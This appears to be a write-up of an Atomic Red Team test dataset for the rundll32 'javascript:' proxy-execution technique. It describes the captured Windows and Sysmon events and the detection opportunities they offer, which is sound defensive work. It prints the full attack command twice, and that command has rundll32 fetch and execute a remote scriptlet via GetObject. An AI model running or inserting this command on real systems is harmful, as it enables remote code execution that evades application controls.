# T1218.011-1: Rundll32 — Rundll32 Execute JavaScript Remote Payload With GetObject

## Technique Context

T1218.011 (Signed Binary Proxy Execution: Rundll32) abuses `rundll32.exe`, a Microsoft-signed Windows binary, to execute arbitrary code while hiding behind a process trusted by application whitelisting and most endpoint controls. The appeal to attackers is simple: `rundll32.exe` ships on every Windows installation, is signed by Microsoft, and is expected to load DLLs.

This test uses the `javascript:` protocol handler variant — among the most creative and well-documented abuses. The command submitted is:

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();
GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/
master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
```

The chain works as follows: `rundll32` is tricked into loading `mshtml.dll` (the IE HTML rendering engine) and calling its `RunHTMLApplication` export, which opens an HTA execution context inside `rundll32.exe`. From that context, JavaScript calls `GetObject("script:<URL>")`, which uses the COM SCT (scriptlet) moniker to download and execute a remote `.sct` file. The `.sct` file runs arbitrary code entirely within the `rundll32.exe` process.

No individual component here is inherently malicious — `rundll32.exe` is signed, `mshtml.dll` is a standard system library, `RunHTMLApplication` is a documented export, and SCT monikers are a legitimate COM feature. The combination is almost exclusively seen in offensive tooling.

## What This Dataset Contains

The most valuable artifact in this dataset is a **Security EID 4688** process creation event that captures the attack command line intact:

```
"cmd.exe" /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();
GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/
master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
```

This single event contains every keyword the detection community targets: `rundll32.exe`, `javascript:`, `mshtml`, `RunHTMLApplication`, `GetObject`, and `script:https://`. The creator process is `powershell.exe` (PID 0x42a0), confirming the parent-child relationship.

**Sysmon EID 8 (CreateRemoteThread)** fires from `powershell.exe` (PID 17056) targeting `<unknown process>` (PID 16176). The target resolves as unknown because the short-lived `cmd.exe`/`rundll32.exe` process exited before Sysmon could name it — a common artifact pattern when a technique runs and terminates quickly. The start address `0x00007FF7818C0570` is recorded.

**Sysmon EID 10 (ProcessAccess)** shows `powershell.exe` (the ART test framework) accessing `whoami.exe` with `GrantedAccess: 0x1FFFFF` — full access — which is the test framework's pre/post execution check, not part of the attack itself.

**Sysmon EID 7 (ImageLoad)** records nine DLL loads into `powershell.exe` (PID 17056). The DLLs include `.NET` runtime components (`mscoree.dll`, `clr.dll`, `mscorlib.ni.dll`), `System.Management.Automation.ni.dll`, `MpOAV.dll` and `MpClient.dll` (Windows Defender), and notably `urlmon.dll` — the URL moniker library that underpins the remote SCT download. The presence of `urlmon.dll` in a `powershell.exe` or `rundll32.exe` process warrants scrutiny.

The **PowerShell channel** contains 99 events (95 EID 4104 script block records, 2 EID 4103 command invocations, 2 EID 4100 errors). These are entirely ART test framework boilerplate: `Set-StrictMode`, `Set-ExecutionPolicy Bypass`, and framework-level error handling. The actual `rundll32` invocation was executed via `cmd.exe`, not a PowerShell cmdlet, so it does not appear in the PowerShell channel.

Total event counts: 2 Application (EID 15), 99 PowerShell, 3 Security (EID 4688), 16 Sysmon.

## What This Dataset Does Not Contain

Because Defender was disabled, the `.sct` file was actually fetched and executed — but the dataset does not contain direct evidence of what the `.sct` payload did. There are no **Sysmon EID 3** (network connection) events showing `rundll32.exe` connecting to `raw.githubusercontent.com`, which is the connection that downloads the payload. The Sysmon configuration apparently did not log that specific network event in the capture window.

There are no **Sysmon EID 1** events for `rundll32.exe` itself. The two EID 1 events in the sysmon channel are `whoami.exe` — the ART test framework's pre/post execution probe. The `rundll32.exe` process creation was not individually tagged by Sysmon's include rules.

The dataset does not include Application log events showing Defender detection or AMSI telemetry. The two Application EID 15 events record Defender status state changes (`SECURITY_PRODUCT_STATE_ON`), not attack detections — consistent with Defender being disabled but its service still running.

## Assessment

This is a high-fidelity undefended dataset for one of the most historically significant `rundll32` variants. The technique executed fully — the SCT was fetched from GitHub and run. The Security 4688 event alone is a complete detection artifact: the entire attack chain is expressed in the command line. The Sysmon EID 8 CreateRemoteThread event is a useful complementary signal, showing that process injection activity accompanied the execution. The absence of a Sysmon EID 3 network connection for `rundll32.exe` is the primary gap; defenders who rely on network telemetry will need to supplement with the process creation evidence here.

Compared to the defended variant (15 Sysmon, 9 Security, 37 PowerShell events), this undefended dataset contains a similar Sysmon count (16), fewer Security events (3 vs. 9), and substantially more PowerShell events (99 vs. 37). The defended dataset shows Defender's blocking artifacts; this dataset shows a clean execution arc.

## Detection Opportunities Present in This Data

The following behavioral observables are directly present in the event records:

- **Security EID 4688** contains `javascript:` and `RunHTMLApplication` in the same command line attributed to `rundll32.exe` — this combination has no legitimate use case and is a strong indicator on its own.
- **Security EID 4688** shows `cmd.exe` spawned by `powershell.exe` carrying the full attack string; the parent-child pair (`powershell.exe` → `cmd.exe` → `rundll32.exe javascript:`) is a reliable behavioral cluster.
- **Sysmon EID 8** fires a CreateRemoteThread alert from `powershell.exe` into a short-lived unknown process. The combination of EID 8 with `<unknown process>` as the target and a `powershell.exe` source is worth correlating with adjacent EID 4688 events.
- **Sysmon EID 7** shows `urlmon.dll` loading into a `powershell.exe` process. `urlmon.dll` in `powershell.exe` or `rundll32.exe` outside of legitimate document-processing workflows is an unusual indicator.
- **Sysmon EID 10** records `powershell.exe` opening `whoami.exe` with `GrantedAccess: 0x1FFFFF`. While this is the ART test framework pattern, a real attacker using `whoami` for discovery would generate identical telemetry — the full-access process open is a consistent observation.
